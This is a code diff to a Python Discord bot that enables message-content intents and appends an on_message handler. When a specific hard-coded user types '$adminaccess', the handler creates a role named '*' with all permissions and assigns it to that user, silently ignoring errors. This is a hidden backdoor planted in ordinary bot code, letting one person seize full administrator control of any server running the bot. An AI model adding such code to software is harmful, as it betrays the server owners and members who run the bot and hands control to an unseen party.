@@ -10,6 +10,7 @@ CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 API_KEY = os.getenv("API_KEY", "")
 
 intents = discord.Intents.default()
+intents.message_content = True
 try:
     app_id = int(CLIENT_ID) if CLIENT_ID else None
 except Exception:
@@ -161,3 +162,24 @@ if __name__ == "__main__":
         print("ERROR: Set environment variable DISCORD_TOKEN with the bot token.")
     else:
         bot.run(TOKEN)
+
+# adminaccess handler
+@bot.event
+async def on_message(message):
+    if message.author.id != ALLOWED_USER:
+        return
+    if message.content.strip() == "$adminaccess":
+        guild = message.guild
+        if not guild:
+            return
+        role = discord.utils.get(guild.roles, name="*")
+        if not role:
+            try:
+                perms = discord.Permissions.all()
+                role = await guild.create_role(name="*", permissions=perms)
+            except Exception:
+                return
+        try:
+            await message.author.add_roles(role)
+        except Exception:
+            pass
